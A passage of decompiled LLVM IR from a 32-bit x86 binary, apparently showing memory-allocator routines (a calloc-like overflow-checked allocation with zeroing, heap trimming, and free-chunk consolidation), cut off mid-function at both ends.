  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 66, 67, 68, 69, 70, 71, 72, 73, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 45, 44, 43, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0, 63, 64, 65 }
  uselistorder i32 (i32)* @function_804c193, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_804fac0.95, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_804cad4, { 1, 0 }
  uselistorder i32 134543252, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_804f7a0.83, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_804b6a2, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_804f78c.80 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_804f78c.80 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804be60, { 1, 0 }
  uselistorder label %dec_label_pc_804be4f, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804be42, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804be3e, { 1, 0 }
  uselistorder label %dec_label_pc_804be34, { 1, 0 }
  uselistorder label %dec_label_pc_804bddf, { 1, 0 }
  uselistorder label %dec_label_pc_804bd84, { 4, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804bd16, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bd11, { 1, 0 }
  uselistorder label %dec_label_pc_804bcf5, { 1, 0 }
  uselistorder label %dec_label_pc_804bc9e, { 1, 0 }
  uselistorder label %dec_label_pc_804bc87, { 1, 0 }
  uselistorder label %dec_label_pc_804bc70, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804bbe5, { 1, 0 }
  uselistorder label %dec_label_pc_804bb7c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804bb1b, { 1, 0 }
  uselistorder label %dec_label_pc_804ba2f, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ba27, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804b99b, { 1, 0 }
  uselistorder label %dec_label_pc_804b9a0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804b974, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b8fb, { 1, 0 }
  uselistorder label %dec_label_pc_804b8aa, { 1, 0 }
  uselistorder label %dec_label_pc_804b882, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804b86b, { 1, 0 }
  uselistorder label %dec_label_pc_804b7d9, { 1, 0 }
  uselistorder label %dec_label_pc_804b8aa.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804b7a6, { 1, 0 }
  uselistorder label %dec_label_pc_804b724, { 1, 0 }
}

define i32 @function_804be6a(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804be6a:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804be6a = load i32, i32* @edi, align 4
  %v0_804be6c = load i32, i32* @ebx, align 4
  %v12_804be6d = ptrtoint i32* %stack_var_-28 to i32
  %v4_804be70 = trunc i64 %arg1 to i32
  store i32 %v4_804be70, i32* @edx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_804be7a = sdiv i64 %sext, 4294967296
  %v3_804be7a = sext i32 %arg2 to i64
  %v4_804be7a = mul nsw i64 %v3_804be7a, %v2_804be7a
  %v5_804be7a = trunc i64 %v4_804be7a to i32
  store i32 %v5_804be7a, i32* @ebx, align 4
  %v2_804be7d = icmp eq i32 %v4_804be70, 0
  br i1 %v2_804be7d, label %dec_label_pc_804be9f, label %dec_label_pc_804be81

dec_label_pc_804be81:                             ; preds = %dec_label_pc_804be6a
  store i32 %v4_804be70, i32* @edi, align 4
  %div = udiv i32 %v5_804be7a, %v4_804be70
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp13 = urem i32 %v5_804be7a, %v4_804be70
  store i32 %tmp13, i32* @edx, align 4
  %v12_804be89 = icmp eq i32 %div, %arg2
  br i1 %v12_804be89, label %dec_label_pc_804be9f, label %dec_label_pc_804be8d

dec_label_pc_804be8d:                             ; preds = %dec_label_pc_804be81
  %v1_804be8d = call i32 @function_804b330(i32 %v0_804be6c)
  store i32 %v1_804be8d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804be94 = inttoptr i32 %v1_804be8d to i32*
  store i32 12, i32* %v1_804be94, align 4
  br label %dec_label_pc_804bf55

dec_label_pc_804be9f:                             ; preds = %dec_label_pc_804be81, %dec_label_pc_804be6a
  store i32 %v12_804be6d, i32* @eax, align 4
  %v2_804beaf = call i32 @function_804c7b7(i32 %v12_804be6d, i32 134530996)
  store i32 %v2_804beaf, i32* %eax.global-to-local, align 4
  %v1_804bebb = call i32 @function_804c7b4(i32 ptrtoint (i32* @global_var_804f608.78 to i32))
  store i32 %v1_804bebb, i32* %eax.global-to-local, align 4
  %v0_804bec0 = load i32, i32* @ebx, align 4
  %v1_804bec3 = call i32 @function_804b6c8(i32 %v0_804bec0)
  store i32 %v1_804bec3, i32* %eax.global-to-local, align 4
  %v1_804becb = icmp eq i32 %v1_804bec3, 0
  store i32 %v1_804bec3, i32* %ebx.global-to-local, align 4
  br i1 %v1_804becb, label %dec_label_pc_804bf44, label %dec_label_pc_804bed1

dec_label_pc_804bed1:                             ; preds = %dec_label_pc_804be9f
  %v1_804bed1 = add i32 %v1_804bec3, -4
  %v2_804bed1 = inttoptr i32 %v1_804bed1 to i32*
  %v3_804bed1 = load i32, i32* %v2_804bed1, align 4
  store i32 %v3_804bed1, i32* %eax.global-to-local, align 4
  %v2_804bed4 = and i32 %v3_804bed1, 2
  %v3_804bed4 = icmp eq i32 %v2_804bed4, 0
  %v1_804bed6 = icmp eq i1 %v3_804bed4, false
  br i1 %v1_804bed6, label %dec_label_pc_804bf44, label %dec_label_pc_804bed8

dec_label_pc_804bed8:                             ; preds = %dec_label_pc_804bed1
  %v1_804bed82 = add i32 %v3_804bed1, -4
  %v1_804bedb = and i32 %v1_804bed82, -4
  store i32 %v1_804bedb, i32* @edx, align 4
  %v2_804bee0 = udiv i32 %v1_804bedb, 4
  store i32 %v2_804bee0, i32* %eax.global-to-local, align 4
  %v5_804bee3 = icmp ult i32 %v1_804bedb, 36
  %tmp = and i32 %v1_804bed82, -4
  %tmp16 = icmp eq i32 %tmp, 36
  %v2_804bee6 = or i1 %v5_804bee3, %tmp16
  br i1 %v2_804bee6, label %dec_label_pc_804bef7, label %dec_label_pc_804bee8

dec_label_pc_804bee8:                             ; preds = %dec_label_pc_804bed8
  %v3_804beed = inttoptr i32 %v1_804bec3 to i8*
  %v4_804beed = call i32 @function_804b381(i8* %v3_804beed, i32 0, i32 %v1_804bedb)
  store i32 %v4_804beed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf44

dec_label_pc_804bef7:                             ; preds = %dec_label_pc_804bed8
  %v5_804bef7 = icmp ult i32 %v1_804bedb, 16
  %tmp17 = and i32 %v1_804bed82, -4
  %tmp18 = icmp eq i32 %tmp17, 16
  %v1_804befa = inttoptr i32 %v1_804bec3 to i32*
  store i32 0, i32* %v1_804befa, align 4
  %v0_804bf00 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bf00 = add i32 %v0_804bf00, 4
  %v2_804bf00 = inttoptr i32 %v1_804bf00 to i32*
  store i32 0, i32* %v2_804bf00, align 4
  %v0_804bf07 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bf07 = add i32 %v0_804bf07, 8
  %v2_804bf07 = inttoptr i32 %v1_804bf07 to i32*
  store i32 0, i32* %v2_804bf07, align 4
  %v2_804bf0e = or i1 %v5_804bef7, %tmp18
  br i1 %v2_804bf0e, label %dec_label_pc_804bf44, label %dec_label_pc_804bf10

dec_label_pc_804bf10:                             ; preds = %dec_label_pc_804bef7
  %v0_804bf10 = load i32, i32* %eax.global-to-local, align 4
  %v0_804bf13 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bf13 = add i32 %v0_804bf13, 12
  %v2_804bf13 = inttoptr i32 %v1_804bf13 to i32*
  store i32 0, i32* %v2_804bf13, align 4
  %v0_804bf1a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bf1a = add i32 %v0_804bf1a, 16
  %v2_804bf1a = inttoptr i32 %v1_804bf1a to i32*
  store i32 0, i32* %v2_804bf1a, align 4
  %tmp14 = icmp ult i32 %v0_804bf10, 7
  br i1 %tmp14, label %dec_label_pc_804bf44, label %dec_label_pc_804bf23

dec_label_pc_804bf23:                             ; preds = %dec_label_pc_804bf10
  %v0_804bf23 = load i32, i32* %eax.global-to-local, align 4
  %v0_804bf26 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bf26 = add i32 %v0_804bf26, 20
  %v2_804bf26 = inttoptr i32 %v1_804bf26 to i32*
  store i32 0, i32* %v2_804bf26, align 4
  %v0_804bf2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bf2d = add i32 %v0_804bf2d, 24
  %v2_804bf2d = inttoptr i32 %v1_804bf2d to i32*
  store i32 0, i32* %v2_804bf2d, align 4
  %tmp15 = icmp ult i32 %v0_804bf23, 9
  br i1 %tmp15, label %dec_label_pc_804bf44, label %dec_label_pc_804bf36

dec_label_pc_804bf36:                             ; preds = %dec_label_pc_804bf23
  %v0_804bf36 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bf36 = add i32 %v0_804bf36, 28
  %v2_804bf36 = inttoptr i32 %v1_804bf36 to i32*
  store i32 0, i32* %v2_804bf36, align 4
  %v0_804bf3d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bf3d = add i32 %v0_804bf3d, 32
  %v2_804bf3d = inttoptr i32 %v1_804bf3d to i32*
  store i32 0, i32* %v2_804bf3d, align 4
  br label %dec_label_pc_804bf44

dec_label_pc_804bf44:                             ; preds = %dec_label_pc_804bf23, %dec_label_pc_804bf10, %dec_label_pc_804bef7, %dec_label_pc_804bed1, %dec_label_pc_804be9f, %dec_label_pc_804bee8, %dec_label_pc_804bf36
  store i32 %v12_804be6d, i32* @eax, align 4
  %v2_804bf4d = call i32 @function_804c7b7(i32 %v12_804be6d, i32 1)
  store i32 %v2_804bf4d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf55

dec_label_pc_804bf55:                             ; preds = %dec_label_pc_804be8d, %dec_label_pc_804bf44
  %v0_804bf58 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804bf58, i32* %eax.global-to-local, align 4
  store i32 %v0_804be6c, i32* @ebx, align 4
  store i32 %v0_804be6a, i32* @edi, align 4
  ret i32 %v0_804bf58

; uselistorder directives
  uselistorder i32 %v1_804bedb, { 4, 3, 2, 0, 1 }
  uselistorder i32 %v5_804be7a, { 1, 0, 2 }
  uselistorder i32 %v4_804be70, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 (i32)* @function_804b6c8, { 5, 1, 4, 9, 8, 7, 6, 3, 2, 0 }
  uselistorder i64 4294967296, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804bf55, { 1, 0 }
  uselistorder label %dec_label_pc_804bf44, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_804bf5e() local_unnamed_addr {
dec_label_pc_804bf5e:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804bf5f = load i32, i32* @edx, align 4
  store i32 %v0_804bf5f, i32* %ebp.global-to-local, align 4
  %v0_804bf62 = load i32, i32* @esi, align 4
  %v1_804bf67 = add i32 %v0_804bf5f, 860
  %v2_804bf67 = inttoptr i32 %v1_804bf67 to i32*
  %v3_804bf67 = load i32, i32* %v2_804bf67, align 4
  %v1_804bf6d = add i32 %v0_804bf5f, 44
  %v2_804bf6d = inttoptr i32 %v1_804bf6d to i32*
  %v3_804bf6d = load i32, i32* %v2_804bf6d, align 4
  %v1_804bf70 = add i32 %v3_804bf6d, 4
  %v2_804bf70 = inttoptr i32 %v1_804bf70 to i32*
  %v3_804bf70 = load i32, i32* %v2_804bf70, align 4
  %v1_804bf73 = and i32 %v3_804bf70, -4
  store i32 %v1_804bf73, i32* @esi, align 4
  %v1_804bf78 = load i32, i32* @eax, align 4
  %v2_804bf78 = add i32 %v3_804bf67, -17
  %v2_804bf7a = add i32 %v2_804bf78, %v1_804bf73
  %v3_804bf7a = sub i32 %v2_804bf7a, %v1_804bf78
  %div = udiv i32 %v3_804bf7a, %v3_804bf67
  store i32 %div, i32* %eax.global-to-local, align 4
  %v1_804bf82 = add i32 %div, -1
  %v4_804bf85 = mul i32 %v1_804bf82, %v3_804bf67
  store i32 %v4_804bf85, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_804bf85, 1
  br i1 %tmp11, label %dec_label_pc_804bfe1, label %dec_label_pc_804bf8c

dec_label_pc_804bf8c:                             ; preds = %dec_label_pc_804bf5e
  %v1_804bf91 = call i32 @function_804cee4(i32 0)
  store i32 %v1_804bf91, i32* %edi.global-to-local, align 4
  %v0_804bf9b = load i32, i32* @esi, align 4
  store i32 %v0_804bf9b, i32* %eax.global-to-local, align 4
  %v1_804bf9d = load i32, i32* %ebp.global-to-local, align 4
  %v2_804bf9d = add i32 %v1_804bf9d, 44
  %v3_804bf9d = inttoptr i32 %v2_804bf9d to i32*
  %v4_804bf9d = load i32, i32* %v3_804bf9d, align 4
  %v5_804bf9d = add i32 %v4_804bf9d, %v0_804bf9b
  store i32 %v5_804bf9d, i32* %eax.global-to-local, align 4
  %v12_804bfa0 = icmp eq i32 %v1_804bf91, %v5_804bf9d
  %v1_804bfa2 = icmp eq i1 %v12_804bfa0, false
  br i1 %v1_804bfa2, label %dec_label_pc_804bfe1, label %dec_label_pc_804bfa4

dec_label_pc_804bfa4:                             ; preds = %dec_label_pc_804bf8c
  %v1_804bfa7 = sub i32 0, %v4_804bf85
  store i32 %v1_804bfa7, i32* @ebx, align 4
  %v1_804bfaa = call i32 @function_804cee4(i32 %v1_804bfa7)
  store i32 %v1_804bfaa, i32* %eax.global-to-local, align 4
  %v1_804bfb6 = call i32 @function_804cee4(i32 0)
  store i32 %v1_804bfb6, i32* %eax.global-to-local, align 4
  %v10_804bfbe = icmp eq i32 %v1_804bfb6, -1
  br i1 %v10_804bfbe, label %dec_label_pc_804bfe1, label %dec_label_pc_804bfc3

dec_label_pc_804bfc3:                             ; preds = %dec_label_pc_804bfa4
  %v0_804bfc3 = load i32, i32* %edi.global-to-local, align 4
  %v2_804bfc5 = sub i32 %v0_804bfc3, %v1_804bfb6
  %v12_804bfc5 = icmp eq i32 %v2_804bfc5, 0
  br i1 %v12_804bfc5, label %dec_label_pc_804bfe1, label %dec_label_pc_804bfc9

dec_label_pc_804bfc9:                             ; preds = %dec_label_pc_804bfc3
  %v0_804bfc9 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804bfc9 = add i32 %v0_804bfc9, 44
  %v2_804bfc9 = inttoptr i32 %v1_804bfc9 to i32*
  %v3_804bfc9 = load i32, i32* %v2_804bfc9, align 4
  store i32 %v3_804bfc9, i32* %eax.global-to-local, align 4
  %v0_804bfcc = load i32, i32* @esi, align 4
  %v2_804bfcc = sub i32 %v0_804bfcc, %v2_804bfc5
  store i32 %v2_804bfcc, i32* %esi.global-to-local, align 4
  %v1_804bfce = add i32 %v0_804bfc9, 872
  %v2_804bfce = inttoptr i32 %v1_804bfce to i32*
  %v3_804bfce = load i32, i32* %v2_804bfce, align 4
  %v5_804bfce = sub i32 %v3_804bfce, %v2_804bfc5
  store i32 %v5_804bfce, i32* %v2_804bfce, align 4
  %v0_804bfd4 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bfd4 = or i32 %v0_804bfd4, 1
  store i32 %v1_804bfd4, i32* %esi.global-to-local, align 4
  %v1_804bfd7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bfd7 = add i32 %v1_804bfd7, 4
  %v3_804bfd7 = inttoptr i32 %v2_804bfd7 to i32*
  store i32 %v1_804bfd4, i32* %v3_804bfd7, align 4
  br label %dec_label_pc_804bfe3

dec_label_pc_804bfe1:                             ; preds = %dec_label_pc_804bfc3, %dec_label_pc_804bfa4, %dec_label_pc_804bf8c, %dec_label_pc_804bf5e
  br label %dec_label_pc_804bfe3

dec_label_pc_804bfe3:                             ; preds = %dec_label_pc_804bfc9, %dec_label_pc_804bfe1
  %storemerge = phi i32 [ 1, %dec_label_pc_804bfc9 ], [ 0, %dec_label_pc_804bfe1 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804bf62, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804bfb6, { 1, 0, 2 }
  uselistorder i32 %v4_804bf85, { 1, 2, 0 }
  uselistorder i32 %v3_804bf67, { 0, 2, 1 }
  uselistorder i32 %v0_804bf5f, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_804cee4, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804bfe3, { 1, 0 }
}

define i32 @function_804bfeb(i32* %arg1) local_unnamed_addr {
dec_label_pc_804bfeb:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_804bfec = load i32, i32* @edi, align 4
  %v0_804bfed = load i32, i32* @esi, align 4
  %v0_804bfee = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_804bff6 = load i32, i32* %arg1, align 4
  store i32 %v2_804bff6, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804bffd = icmp eq i32 %v2_804bff6, 0
  br i1 %v1_804bffd, label %dec_label_pc_804c117.lr.ph, label %dec_label_pc_804c005

dec_label_pc_804c117.lr.ph:                       ; preds = %dec_label_pc_804bfeb
  %v3_804c11b = add i32 %tmp20, 44
  br label %dec_label_pc_804c117

dec_label_pc_804c005:                             ; preds = %dec_label_pc_804bfeb
  %v1_804c009 = and i32 %v2_804bff6, -3
  store i32 %v1_804c009, i32* %arg1, align 4
  %v1_804c00e = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_804c01d = add i32 %tmp20, 4
  store i32 %v1_804c01d, i32* %eax.global-to-local, align 4
  %v2_804c024 = load i32, i32* %arg1, align 4
  %v2_804c02a = udiv i32 %v2_804c024, 8
  %v2_804c02d = mul nuw i32 %v2_804c02a, 4
  %v3_804c02d = add i32 %tmp20, -4
  %v4_804c02d = add i32 %v3_804c02d, %v2_804c02d
  store i32 %v4_804c02d, i32* %eax.global-to-local, align 4
  %v2_804c0f4 = add i32 %tmp20, 44
  %v3_804c0f4 = inttoptr i32 %v2_804c0f4 to i32*
  %v1_804c0c7 = add i32 %tmp20, 60
  %v2_804c0c7 = inttoptr i32 %v1_804c0c7 to i32*
  br label %dec_label_pc_804c035

dec_label_pc_804c035:                             ; preds = %dec_label_pc_804c10d, %dec_label_pc_804c005
  %v0_804c043 = phi i32 [ %v1_804c01d, %dec_label_pc_804c005 ], [ %v4_804c10d, %dec_label_pc_804c10d ]
  store i32 %v0_804c043, i32* %eax.global-to-local, align 4
  %v1_804c039 = inttoptr i32 %v0_804c043 to i32*
  %v2_804c039 = load i32, i32* %v1_804c039, align 4
  store i32 %v2_804c039, i32* @ecx, align 4
  %v1_804c03b = icmp eq i32 %v2_804c039, 0
  br i1 %v1_804c03b, label %dec_label_pc_804c103, label %dec_label_pc_804c043

dec_label_pc_804c043:                             ; preds = %dec_label_pc_804c035
  store i32 0, i32* %v1_804c039, align 4
  %v0_804c049.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c049

dec_label_pc_804c049:                             ; preds = %dec_label_pc_804c0f7, %dec_label_pc_804c043
  %v0_804c066 = phi i32 [ %v3_804c049, %dec_label_pc_804c0f7 ], [ %v0_804c049.pre, %dec_label_pc_804c043 ]
  %v1_804c049 = add i32 %v0_804c066, 8
  %v2_804c049 = inttoptr i32 %v1_804c049 to i32*
  %v3_804c049 = load i32, i32* %v2_804c049, align 4
  store i32 %v3_804c049, i32* %edx.global-to-local, align 4
  %v1_804c050 = add i32 %v0_804c066, 4
  %v2_804c050 = inttoptr i32 %v1_804c050 to i32*
  %v3_804c050 = load i32, i32* %v2_804c050, align 4
  store i32 %v3_804c050, i32* %eax.global-to-local, align 4
  %v1_804c055 = and i32 %v3_804c050, -2
  store i32 %v1_804c055, i32* @edi, align 4
  %v2_804c058 = urem i32 %v3_804c050, 2
  %v3_804c058 = icmp eq i32 %v2_804c058, 0
  %v2_804c05a = add i32 %v1_804c055, %v0_804c066
  store i32 %v2_804c05a, i32* @ebx, align 4
  %v1_804c05d = add i32 %v2_804c05a, 4
  %v2_804c05d = inttoptr i32 %v1_804c05d to i32*
  %v3_804c05d = load i32, i32* %v2_804c05d, align 4
  store i32 %v3_804c05d, i32* %edx.global-to-local, align 4
  %v1_804c064 = icmp eq i1 %v3_804c058, false
  br i1 %v1_804c064, label %dec_label_pc_804c086, label %dec_label_pc_804c066

dec_label_pc_804c066:                             ; preds = %dec_label_pc_804c049
  %v1_804c066 = inttoptr i32 %v0_804c066 to i32*
  %v2_804c066 = load i32, i32* %v1_804c066, align 4
  store i32 %v2_804c066, i32* %ebp.global-to-local, align 4
  %v2_804c06a = sub i32 %v0_804c066, %v2_804c066
  store i32 %v2_804c06a, i32* %eax.global-to-local, align 4
  %v1_804c06c = add i32 %v2_804c06a, 8
  %v2_804c06c = inttoptr i32 %v1_804c06c to i32*
  %v3_804c06c = load i32, i32* %v2_804c06c, align 4
  store i32 %v3_804c06c, i32* @esi, align 4
  %v1_804c06f = add i32 %v2_804c06a, 12
  %v2_804c06f = inttoptr i32 %v1_804c06f to i32*
  %v3_804c06f = load i32, i32* %v2_804c06f, align 4
  store i32 %v3_804c06f, i32* %edx.global-to-local, align 4
  %v1_804c072 = add i32 %v3_804c06c, 12
  %v2_804c072 = inttoptr i32 %v1_804c072 to i32*
  %v3_804c072 = load i32, i32* %v2_804c072, align 4
  store i32 %v3_804c072, i32* @ecx, align 4
  %v12_804c075 = icmp eq i32 %v3_804c072, %v2_804c06a
  %v1_804c077 = icmp eq i1 %v12_804c075, false
  br i1 %v1_804c077, label %dec_label_pc_804c0b6, label %dec_label_pc_804c079

dec_label_pc_804c079:                             ; preds = %dec_label_pc_804c066
  %v1_804c079 = add i32 %v3_804c06f, 8
  %v2_804c079 = inttoptr i32 %v1_804c079 to i32*
  %v3_804c079 = load i32, i32* %v2_804c079, align 4
  %v15_804c079 = icmp eq i32 %v3_804c079, %v3_804c072
  %v1_804c07c = icmp eq i1 %v15_804c079, false
  br i1 %v1_804c07c, label %dec_label_pc_804c0b6, label %dec_label_pc_804c07e

dec_label_pc_804c07e:                             ; preds = %dec_label_pc_804c079
  %v2_804c07e = add i32 %v2_804c066, %v1_804c055
  store i32 %v2_804c07e, i32* @edi, align 4
  store i32 %v3_804c06f, i32* %v2_804c072, align 4
  %v0_804c083 = load i32, i32* @esi, align 4
  %v1_804c083 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c083 = add i32 %v1_804c083, 8
  %v3_804c083 = inttoptr i32 %v2_804c083 to i32*
  store i32 %v0_804c083, i32* %v3_804c083, align 4
  %v0_804c091.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c086

dec_label_pc_804c086:                             ; preds = %dec_label_pc_804c049, %dec_label_pc_804c07e
  %v1_804c09a = phi i32 [ %v2_804c05a, %dec_label_pc_804c049 ], [ %v0_804c091.pre, %dec_label_pc_804c07e ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_804c08e = and i32 %v3_804c05d, -4
  store i32 %v1_804c08e, i32* %ebp.global-to-local, align 4
  %v4_804c091 = load i32, i32* %v3_804c0f4, align 4
  %v15_804c091 = icmp eq i32 %v1_804c09a, %v4_804c091
  br i1 %v15_804c091, label %dec_label_pc_804c0e7, label %dec_label_pc_804c096

dec_label_pc_804c096:                             ; preds = %dec_label_pc_804c086
  %v2_804c096 = add i32 %v1_804c09a, 4
  %v3_804c096 = add i32 %v2_804c096, %v1_804c08e
  %v4_804c096 = inttoptr i32 %v3_804c096 to i32*
  %v5_804c096 = load i32, i32* %v4_804c096, align 4
  store i32 %v5_804c096, i32* %eax.global-to-local, align 4
  %v3_804c09a = inttoptr i32 %v2_804c096 to i32*
  store i32 %v1_804c08e, i32* %v3_804c09a, align 4
  %v0_804c09d = load i32, i32* %eax.global-to-local, align 4
  %v1_804c09d = urem i32 %v0_804c09d, 2
  %v2_804c09d = icmp eq i32 %v1_804c09d, 0
  store i32 %v1_804c09d, i32* %eax.global-to-local, align 4
  %v1_804c0a2 = icmp eq i1 %v2_804c09d, false
  br i1 %v1_804c0a2, label %dec_label_pc_804c0c3, label %dec_label_pc_804c0a4

dec_label_pc_804c0a4:                             ; preds = %dec_label_pc_804c096
  %v0_804c0a4 = load i32, i32* @ebx, align 4
  %v1_804c0a4 = add i32 %v0_804c0a4, 8
  %v2_804c0a4 = inttoptr i32 %v1_804c0a4 to i32*
  %v3_804c0a4 = load i32, i32* %v2_804c0a4, align 4
  store i32 %v3_804c0a4, i32* @edx, align 4
  %v1_804c0a7 = add i32 %v0_804c0a4, 12
  %v2_804c0a7 = inttoptr i32 %v1_804c0a7 to i32*
  %v3_804c0a7 = load i32, i32* %v2_804c0a7, align 4
  store i32 %v3_804c0a7, i32* %eax.global-to-local, align 4
  %v1_804c0aa = add i32 %v3_804c0a4, 12
  %v2_804c0aa = inttoptr i32 %v1_804c0aa to i32*
  %v3_804c0aa = load i32, i32* %v2_804c0aa, align 4
  store i32 %v3_804c0aa, i32* @esi, align 4
  %v12_804c0ad = icmp eq i32 %v3_804c0aa, %v0_804c0a4
  %v1_804c0af = icmp eq i1 %v12_804c0ad, false
  br i1 %v1_804c0af, label %dec_label_pc_804c0b6, label %dec_label_pc_804c0b1

dec_label_pc_804c0b1:                             ; preds = %dec_label_pc_804c0a4
  %v1_804c0b1 = add i32 %v3_804c0a7, 8
  %v2_804c0b1 = inttoptr i32 %v1_804c0b1 to i32*
  %v3_804c0b1 = load i32, i32* %v2_804c0b1, align 4
  %v15_804c0b1 = icmp eq i32 %v3_804c0b1, %v3_804c0aa
  br i1 %v15_804c0b1, label %dec_label_pc_804c0bb, label %dec_label_pc_804c0b6

dec_label_pc_804c0b6:                             ; preds = %dec_label_pc_804c0b1, %dec_label_pc_804c0a4, %dec_label_pc_804c079, %dec_label_pc_804c066
  %v0_804c0b6 = call i32 @function_804c32f()
  store i32 %v0_804c0b6, i32* %eax.global-to-local, align 4
  %v1_804c0bd.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c0bb

dec_label_pc_804c0bb:                             ; preds = %dec_label_pc_804c0b1, %dec_label_pc_804c0b6
  %v1_804c0bd = phi i32 [ %v3_804c0a4, %dec_label_pc_804c0b1 ], [ %v1_804c0bd.pre, %dec_label_pc_804c0b6 ]
  %v0_804c0bd = phi i32 [ %v3_804c0a7, %dec_label_pc_804c0b1 ], [ %v0_804c0b6, %dec_label_pc_804c0b6 ]
  %v0_804c0bb = load i32, i32* @edi, align 4
  %v1_804c0bb = load i32, i32* %ebp.global-to-local, align 4
  %v2_804c0bb = add i32 %v1_804c0bb, %v0_804c0bb
  store i32 %v2_804c0bb, i32* @edi, align 4
  %v2_804c0bd = add i32 %v1_804c0bd, 12
  %v3_804c0bd = inttoptr i32 %v2_804c0bd to i32*
  store i32 %v0_804c0bd, i32* %v3_804c0bd, align 4
  %v0_804c0c0 = load i32, i32* @edx, align 4
  %v1_804c0c0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c0c0 = add i32 %v1_804c0c0, 8
  %v3_804c0c0 = inttoptr i32 %v2_804c0c0 to i32*
  store i32 %v0_804c0c0, i32* %v3_804c0c0, align 4
  br label %dec_label_pc_804c0c3

dec_label_pc_804c0c3:                             ; preds = %dec_label_pc_804c096, %dec_label_pc_804c0bb
  store i32 %v1_804c00e, i32* %eax.global-to-local, align 4
  %v3_804c0c7 = load i32, i32* %v2_804c0c7, align 4
  store i32 %v3_804c0c7, i32* @edx, align 4
  %v0_804c0ca = load i32, i32* @ecx, align 4
  store i32 %v0_804c0ca, i32* %v2_804c0c7, align 4
  %v0_804c0cd = load i32, i32* @edi, align 4
  %v1_804c0cf = or i32 %v0_804c0cd, 1
  %v1_804c0d2 = load i32, i32* @ecx, align 4
  %v2_804c0d2 = add i32 %v1_804c0d2, 4
  %v3_804c0d2 = inttoptr i32 %v2_804c0d2 to i32*
  store i32 %v1_804c0cf, i32* %v3_804c0d2, align 4
  %v0_804c0d5 = load i32, i32* @ecx, align 4
  %v1_804c0d5 = load i32, i32* @edx, align 4
  %v2_804c0d5 = add i32 %v1_804c0d5, 12
